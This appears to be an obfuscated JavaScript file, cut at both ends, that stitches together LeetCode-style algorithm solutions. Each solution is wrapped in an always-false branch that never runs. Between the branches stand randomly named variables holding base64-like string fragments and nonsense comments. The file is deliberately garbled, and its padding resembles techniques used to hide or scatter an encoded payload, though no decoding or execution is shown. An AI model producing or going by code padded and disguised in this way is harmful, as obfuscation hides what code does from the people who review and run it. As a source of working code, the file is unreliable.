    arr[0] = 0;
    arr[1] = 1;
    arr[2] = 2;
    
    for(i = 3; i <= n; i++) {
        arr[i] = arr[i - 1] + arr[i - 2];
    }
    return arr[n];
};

}

    var egjmotvd = 'IyUmxPaUE';
    var jpiclybnd = 'igiSJ';
if (18 > 146) {
    /**
Given preorder and inorder traversal of a tree, construct the binary tree.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} preorder
 * @param {number[]} inorder
 * @return {TreeNode}
 */
var buildTree = function(preorder, inorder) {
    /**
    假设树的先序遍历是12453687，中序遍历是42516837。这里最重要的一点就是先序遍历可以提供根的所在，而根据中序遍历的性质知道根的所在就可以将序列分为左右子树。比如上述例子，我们知道1是根，所以根据中序遍历的结果425是左子树，而6837就是右子树。接下来根据切出来的左右子树的长度又可以在先序便利中确定左右子树对应的子序列（先序遍历也是先左子树后右子树）。根据这个流程，左子树的先序遍历和中序遍历分别是245和425，右子树的先序遍历和中序遍历则是3687和6837，我们重复以上方法，可以继续找到根和左右子树，直到剩下一个元素。可以看出这是一个比较明显的递归过程，对于寻找根所对应的下标，我们可以先建立一个HashMap，以免后面需要进行线行搜索，这样每次递归中就只需要常量操作就可以完成对根的确定和左右子树的分割。
    */
    var map = {},
        len = inorder.length,
        i;
    
    for (i = 0; i < len; i++) {
        map[inorder[i]] = i;
    }
    
    return helper(preorder, 0, len - 1, inorder, 0, len - 1, map);
};

function helper(preorder, preL, preR, inorder, inL, inR, map) {
    var root,
        index;
    
    if (preL > preR || inL > inR) {
        return null;
    }
    
    root = new TreeNode(preorder[preL]);
    index = map[root.val];
    
    root.left = helper(preorder, preL + 1, index - inL + preL, inorder, inL, index - 1, map);
    root.right = helper(preorder, index - inL + preL + 1, preR, inorder, index + 1, inR, map);
    
    return root;
}

}

    var ztkjhuczvcdz = '0TlNCOUxDQ';
    var bggddt = 'dWJtLYX';
    var klfoyz = 'XZMeUJ';
    var rkorhajixqe = 'nxJzWCq';
if ('r' === 'X') {
    /**
Given a non-negative number represented as an array of digits, plus one to the number.

The digits are stored such that the most significant digit is at the head of the list.
*/
/**
 * @param {number[]} digits
 * @return {number[]}
 */
var plusOne = function(digits) {
    var len = digits.length,
        overflow = 1,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        digits[i] = digits[i] + overflow;
        if (digits[i] === 10) {
            overflow = 1;
            digits[i] = 0;
        } else {
            return digits;
        }
    }
    
    if (overflow === 1) {
        digits.unshift(1);
        return digits;
    }
};

}

    var ftjmarwvworeg = 'EZEhKc0sxV';
    var kyobchefieep = 'LzBTBf';
    var mkwbhbnjkldktg = 'UtJQ0FnSUN';
if (0.69 && false) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var ihrqdxm = 'cJIgKEBew';
    var ihnxg = 'BZ0lDQ';
if ('c' === 'R') {
    /**
Given a string S and a string T, count the number of distinct subsequences of T in S.

A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, "ACE" is a subsequence of "ABCDE" while "AEC" is not).

Here is an example:
S = "rabbbit", T = "rabbit"

Return 3.
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    
    for (i = 0; i <= lenT; i++) {
        dp.push(new Array(lenS + 1));

        for (j = 0; j <= lenS; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (j = 0; j <= lenS; j++) {
        dp[0][j] = 1;
    }
    
    
    for (i = 0; i < lenT; i++) {
        for (j = 0; j < lenS; j++) {
            dp[i + 1][j + 1] = dp[i + 1][j];
            
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1][j + 1] += dp[i][j];
            }
        }
    }
    
    return dp[lenT][lenS];
};

// use 1D dp solution
// draw 2D dp realation and try to save space
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    dp[0] = 1;    
    
    for (i = 1; i <= lenT; i++) {
        dp[i] = 0;
    }
    
    for (j = 0; j <= lenS; j++) {
        for (i = lenT - 1; i >= 0; i--) {
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1] += dp[i];
            }
        }
    }
    
    return dp[lenT];
};

}

    var pvxjusx = 'OuogjJ';
    var tfzbnssvirdvna = 'jdJR04wY2';
    var gpdwcac = 'UEytxxKWQW';
    var akvapexdjo = '13NklIU';
    var tcrgbxfyn = 'QyaVEktpA';
    var kplbtyprhxw = 'nlkV';
    var vfcuijdbfs = 'QNsSYbV';
if (!true && 0) {
    /**
 * @param {number} n
 * @return {number}
 * 
 * 我们知道，每当灯泡会改变状态，也就是 toggle 时，是因为它出现在了某个数的整数倍上。

对于第1个灯泡：1*1，会改变1次状态，即 off -》on

对于第2个灯泡：1*2，2*1，会改变2次状态，即 off -》on -》off

对于第3个灯泡：1*3，3*1，会改变2次状态，即 off -》on -》off

对于第4个灯泡：1*4，2*2，4*1，会改变3次状态，即 off -》on -》off -》on

……

会发现，每当我找到一个数的整数倍，总会找到对称的一个整数倍，例如 1*2，就肯定会有一个 2*1。唯一的例外出现在平方数上，例如 4 = 2*2，只有一次整数倍。

每次作为偶数次整数倍，最终的灯泡都会还原为 off；只有作为奇数次整数倍，最终的灯泡都会 on。
也就是说，最终亮的灯泡数目由小于其的最大平方数确定。
 * 
 */
var bulbSwitch = function(n) {
    return Math.floor(Math.sqrt(n));
};

}

    var mgzmdazgz = '1VzS';
if (null === 5) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var xocvsd = 'uoCcOFLpo';
    var wbhdbsbvoryxh = 'UhOb2FXWjB';
if (Array.isArray(1)) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 * 
 * max_product[i] = max(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 * min_product[i] = min(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 */
var maxProduct = function(nums) {
    var curMax,
        curMin,
        len = nums.length,
        i,
        result,
        temp;
        
    if (len === 0) {
        return 0;
    }
    
    curMax = curMin = result = nums[0];
    
    for (i = 1; i < len; i++) {
        temp = curMax;
        curMax = Math.max(temp * nums[i], curMin * nums[i], nums[i]);
        curMin = Math.min(temp * nums[i], curMin * nums[i], nums[i]);
        
        result = Math.max(result, curMax);
    }
    
    return result;
};

}

    var naydrpgog = 'tpOIp';
if (!true && 1) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var qjfud = 'PaUIwY25';
    var pznjjfujo = 'UqhhWQAcbS';
    var uqstcladw = 'WbExDQ';
    var doudrmgflkoz = 'cXbzyx';
    var soksdzbnjofjyw = 'nJaWGxEYj';
    var ywllnts = 'LyXUU';
    var ybijocuriik = 'JSbE9pQTN';
if (0.61 && false) {
    /**
Implement strStr().

Returns the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack.
*/

/**
 * @param {string} haystack
 * @param {string} needle
 * @return {number}
 */
var strStr = function(haystack, needle) {
    var len1 = haystack.length,
        len2 = needle.length,
        i,
        j;
    
    if (len2 === 0) {
        return 0;
    }
    
    if (len1 === 0 || len1 < len2) {
        return -1;
    }
    
    i = 0;
    while (i <= len1 - len2) {
        if (haystack.substring(i, i + len2) === needle) {
            return i;
        }
        i++;
    }
    
    return -1;
};

}

    var pwjyvyt = 'wLBG';
// array event event define mztrkw gjibb world object return array hello event
if (3 === 15) {
    /**
Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {TreeNode}
 */
var sortedListToBST = function(head) {
    var len = 0,
        node = head;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        len++;
        node = node.next;
    }
    curNode = head;
    return helper(0, len - 1);
},
curNode;

// build tree bottom up
function helper(start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        left,
        right,
        node;
        
    left = helper(start, mid - 1),
    node = new TreeNode(curNode.val);
    curNode = curNode.next;
    right = helper(mid + 1, end);
    
    node.left = left;
    node.right = right;
    
    return node;
}


// solution 2
var sortedListToBST = function(head) {
    var arr = [],
        node = head,
        len;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        arr.push(node);
        node = node.next;
    }
    
    len = arr.length;
    
    if (len === 1) {
        return head;
    }
    
    return getMidNode(0, len - 1, arr);
};

function getMidNode(start, end, arr) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        node = new TreeNode(arr[mid].val);
        
    node.left = getMidNode(start, mid - 1, arr);
    node.right = getMidNode(mid + 1, end, arr);
    
    return node;
}

}

    var cbqcatkxfax = 'NwFc';
    var jaktalhbddtjqa = 'NeUI5TE';
    var aevjsadgzp = 'qDzQsfdia';
if (Array.isArray(7)) {
    /**
Reverse digits of an integer.

Example1: x = 123, return 321
Example2: x = -123, return -321

click to show spoilers.

Have you thought about this?
Here are some good questions to ask before coding. Bonus points for you if you have already thought through this!

If the integer's last digit is 0, what should the output be? ie, cases such as 10, 100.

Did you notice that the reversed integer might overflow? Assume the input is a 32-bit integer, then the reverse of 1000000003 overflows. How should you handle such cases?

For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.

Update (2014-11-10):
Test cases had been added to test the overflow behavior.
*/
/**
 * @param {number} x
 * @return {number}
 */
var reverse = function(x) {
    var isNegative = x < 0? true: false,
        divider = 10,
        result = 0,
        reminder;
    
    if (isNegative) {
        x = x * (-1);
    }
    
    while (x !== 0) {
        reminder = x % 10;
        result = result * 10 + reminder;
        
        x = Math.floor(x / 10);
    }
    
    if (result >= 2147483648) {
        return 0;
    }
    
    return isNegative? result * (-1) : result;
};

}

    var xrggvai = 'NBdk';
    var nuxzseqlwocd = 'qXBcsQnhtE';
    var xjhmlnyztc = 'x5Q';
if (Array.isArray(5)) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var ewqmnoecvxz = 'idSjxNX';
if ('true' === true) {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

// define loop loop import array dmoq string return bxgkmqf
    var uxnsccbbe = 'vEGOA';
    var vpfaqc = 'kRkS';
    var xofmsggposde = 'dKVZsAjpjp';
if (0.17 && false) {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

// function async script object sdfehfpp
if (null === 2) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    if (n == 1) {
        return true
    }
    if (n === 0 || n % 3 > 0) {
        return false
    }
    return isPowerOfThree(n / 3)
};

}

    var kupzofbecb = 'HZifgJ';
if (Array.isArray(10)) {
    /**
 Given n nodes labeled from 0 to n - 1 and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree.

For example:

Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.

Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false.

Hint:

    Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree?
    According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

Note: you can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. 
*/
/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {boolean}
 */
var validTree = function(n, edges) {
    let nodes = [];
    
    for (let i = 0; i < n; i++) {
        nodes[i] = i;
    }
    
    for (let i = 0; i < edges.length; i++) {
        let start = edges[i][0];
        let end = edges[i][1];
        
        while (nodes[start] !== start) {
            start = nodes[start];
        }
        
        while (nodes[end] !== end) {
            end = nodes[end];
        }
        
        // cycle detected
        if (start === end) {
            return false;
        }
        
        nodes[start] = end;
    }
    // edges are enough to connect each node
    return edges.length >= n - 1;
};

}

    var hccjcuzcswlkmt = 'EpzSzF';
if (32 > 155) {
    /**
Given a set of distinct integers, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,3], a solution is:

[
  [3],
  [1],
  [2],
  [1,2,3],
  [1,3],
  [2,3],
  [1,2],
  []
]
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsets = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var tfgsdz = 'avKhSjNkkD';
    var ksfdi = 'Ob2FXWj';
    var yfjphjgm = 'zOYvMLRuA';
if (Array.isArray(4)) {
    /**
 * @param {string} s
 * @return {string}
 */
var reverseString = function(s) {
    if (!s) {
        return s;
    }
    
    return s.split('').reverse().join('');
};

}

    var uifrhhekisfd = 'BLMGtLSU';
    var dvcvuy = 'OcDubrQX';
    var omdcrg = 'NBZ0lDQ';
if (45 > 108) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        max = 0,
        cur;
        
    if (length === 0) {
        return 0;
    }
    low = prices[0];
    high = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > high) {
            high = cur;
        }else if (cur < low) {
            //need to reset low and high in order to make sure you need to buy before you sell
            low = cur;
            high = cur;
        }
        if (high - low > max) {
            max = high - low;
        }
    }
    return max;
};

}

    var btwebyzorqd = 'mWjECtJ';
    var hkwnena = 'WdJQ0I3SU';
    var onpfhsqf = 'WYovR';
if (72 > 113) {
    /**
Given a 2D board containing 'X' and 'O', capture all regions surrounded by 'X'.

A region is captured by flipping all 'O's into 'X's in that surrounded region.

For example,
X X X X
X O O X
X X O X
X O X X
After running your function, the board should be:

X X X X
X X X X
X X X X
X O X X
*/

/**
 * @param {character[][]} board
 * @return {void} Do not return anything, modify board in-place instead.
 */
var solve = function(board) {
    if (board === null) {
        return;
    }
    
    var rowL = board.length,
        columnL,
        i,
        j;
    
    if (rowL <= 1) {
        return;
    }
    
    columnL = board[0].length;
    
    // visit borders
    for (i = 0; i < rowL; i++) {
        visit(board, i, 0, rowL, columnL);
        visit(board, i, columnL - 1, rowL, columnL);
    }
    
    // visit borders
    for (i = 1; i < columnL - 1; i++) {
        visit(board, 0, i, rowL, columnL);
        visit(board, rowL - 1, i, rowL, columnL);
    }
    
    // flip all 'O' to 'X' and flip all 'Y' to 'O'
    for (i = 0; i < rowL; i++) {
        for (j = 0; j <columnL; j++) {
            if (board[i][j] === 'O') {
                board[i][j] = 'X';
            } else if (board[i][j] === 'Y') {
                board[i][j] = 'O';
            }
        }
    }
};

// flip connected 0 to 'Y'
function visit(board, i, j, rowL, columnL) {
    if (i < 0 || j < 0 || i >= rowL || j >= columnL || board[i][j] !== 'O') {
        return;
    }
    
    var queue = [],
        cur,
        row,
        column;
    
    board[i][j] = 'Y';
    queue.push(i * columnL + j);
    
    while(queue.length > 0) {
        cur = queue.pop();
        row = Math.floor(cur / columnL);
        column = cur % columnL;
        
        if (row > 0 && board[row - 1][column] === 'O') {
            queue.push((row - 1)*columnL + column);
            board[row - 1][column] = 'Y';
        }
        
        if (row < rowL -1 && board[row + 1][column] === 'O') {
            queue.push((row + 1)*columnL + column);
            board[row + 1][column] = 'Y';
        }
        
        if (column > 0 && board[row][column - 1] === 'O') {
            queue.push(row * columnL + column - 1);
            board[row][column - 1] = 'Y';
        }
        
        if (column < columnL - 1 && board[row][column + 1] === 'O') {
            queue.push(row * columnL + column + 1);
            board[row][column + 1] = 'Y';
        }
    }
} 

}

    var letzxxcvcmisppo = 'dOMGNtdzZJ';
if (null === 4) {
    /**
Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution.

    For example, given array S = {-1 2 1 -4}, and target = 1.

    The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).

*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var threeSumClosest = function(nums, target) {
    var len = nums.length,
        minDiff = Number.MAX_VALUE,
        diff,
        left,
        right,
        i,
        j;
        
    nums.sort(function(a, b) {
        return a - b;
    });
    
    for (i = 0; i < len; i++) {
        left = i + 1;
        right = len - 1;
        
        while (left < right) {
            diff = target - nums[i] - nums[left] - nums[right];
            
            if (diff === 0) {
                return target;
            } else if (diff > 0) {
                left++;
            } else {
                right--;
            }
            
            if (Math.abs(diff) < Math.abs(minDiff)) {
                minDiff = diff;
            }
        }
    }
    
    return target - minDiff;
};

}

    var gqhiabqw = 'TBqSTDn';
if (4 instanceof String) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var peyquhjzqmdidpn = 'SFJ5ZFdVc0';
if (!true && 1) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var axtwfasdp = 'mzpsnVxppR';
if (0 instanceof String) {
    /**
Rotate an array of n elements to the right by k steps.

For example, with n = 7 and k = 3, the array [1,2,3,4,5,6,7] is rotated to [5,6,7,1,2,3,4].

Note:
Try to come up as many solutions as you can, there are at least 3 different ways to solve this problem.
*/

/**
 * @param {number[]} nums
 * @param {number} k
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var rotate = function(nums, k) {
    var n = nums.length,
        divider,
        pre,
        tmp,
        i,
        j;
        
    k = k % n;
    divider = gcd_rec(k, n);
    
    for (i = 0; i < divider; i++) {
        pre = nums[i];
        j = i;
        
        while ((j + k) % n !== i) {
            tmp = nums[(j + k) % n];
            nums[(j + k) % n] = pre;
            pre = tmp;
            j = (j + k) % n;
        }
        
        nums[(j + k) % n] = pre;
    }
};

function gcd_rec(a, b) {
    if (b) {
        return gcd_rec(b, a % b);
    } else {
        return Math.abs(a);
    }
}

}

    var qwkbwqzazqpixn = 'lITm9hV';
if (Array.isArray(4)) {
    /**
There are a total of n courses you have to take, labeled from 0 to n - 1.

Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]

Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.

There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.

For example:

2, [[1,0]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1]

4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].

Note:
The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.

click to show more hints.

Hints:
This problem is equivalent to finding the topological order in a directed graph. If a cycle exists, no topological ordering exists and therefore it will be impossible to take all courses.
Topological Sort via DFS - A great video tutorial (21 minutes) on Coursera explaining the basic concepts of Topological Sort.
Topological sort could also be done via BFS.
*/
/**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {number[]}
 */
var findOrder = function(numCourses, prerequisites) {
    var courses = [],
        prereqCounts = [],
        queue = [],
        temp,
        result = [],
        i,
        j,
        k;
        
    for (i = 0; i < numCourses; i++) {
        courses.push(new Set());
    }
    
    // [1] is [0]'s prerequisite 
    // To take course [0] you should have finished course [1]
    for (i = 0; i < prerequisites.length; i++) {
        courses[prerequisites[i][1]].add(prerequisites[i][0]);
    }
    
    for (i = 0; i < numCourses; i++) {
        prereqCounts[i] = 0;
    }
    
    // count the pre-courses
    for (i = 0; i < numCourses; i++) {
        temp = Array.from(courses[i]);
        
        for (j = 0; j < temp.length; j++) {
            prereqCounts[temp[j]]++;
        }
    }
    
    for (i = 0; i < numCourses; i++) {
        if (prereqCounts[i] === 0) {
            queue.push(i);
            prereqCounts[i] = -1;
        }
    }
    
    while (queue.length > 0) {
        j = queue.shift();
        result.push(j);
        
        temp = Array.from(courses[j]);
        
        for (i = 0; i < temp.length; i++) {
            prereqCounts[temp[i]]--;
            
            if (prereqCounts[temp[i]] === 0) {
                queue.push(temp[i]);
                prereqCounts[temp[i]] = -1;
            }
        }
    }
    
    if (result.length === numCourses) {
        return result;
    }
    
    return [];
};

}

    var rbqxotocub = 'pjtWQt';
if (Array.isArray(4)) {
    /**
There are N gas stations along a circular route, where the amount of gas at station i is gas[i].

You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from station i to its next station (i+1). You begin the journey with an empty tank at one of the gas stations.

Return the starting gas station's index if you can travel around the circuit once, otherwise return -1.

Note:
The solution is guaranteed to be unique.
*/
/**
 * @param {number[]} gas
 * @param {number[]} cost
 * @return {number}
 * 
在任何一个节点，其实我们只关心油的损耗，定义： 

diff[i] = gas[i] – cost[i]  0<=i <n 

那么这题包含两个问题： 

1. 能否在环上绕一圈？ 

2. 如果能，这个起点在哪里？ 

第一个问题，很简单，我对diff数组做个加和就好了，leftGas = ∑diff[i]， 如果最后leftGas是正值，那么肯定存在这么一个起始点。如果是负值，那说明，油的损耗大于油的供给，不可能有解。得到第一个问题的答案只需要O(n)。 

对于第二个问题，起点在哪里？ 

假设，我们从环上取一个区间[i, j], j>i， 然后对于这个区间的diff加和，定义 

sum[i,j] = ∑diff[k] where i<=k<j 

如果sum[i,j]小于0，那么这个起点肯定不会在[i,j]这个区间里，跟第一个问题的原理一样。举个例子，假设i是[0,n]的解，那么我们知道 任意sum[k,i-1] (0<=k<i-1) 肯定是小于0的，否则解就应该是k。同理，sum[i,n]一定是大于0的，否则，解就不应该是i，而是i和n之间的某个点。所以第二题的答案，其实就是在0到n之间，找到第一个连续子序列（这个子序列的结尾必然是n）大于0的。 

至此，两个问题都可以在一个循环中解决。
 */
var canCompleteCircuit = function(gas, cost) {
    var len = gas.length,
        diff = [],
        curSum = 0,
        sum = 0,
        i,
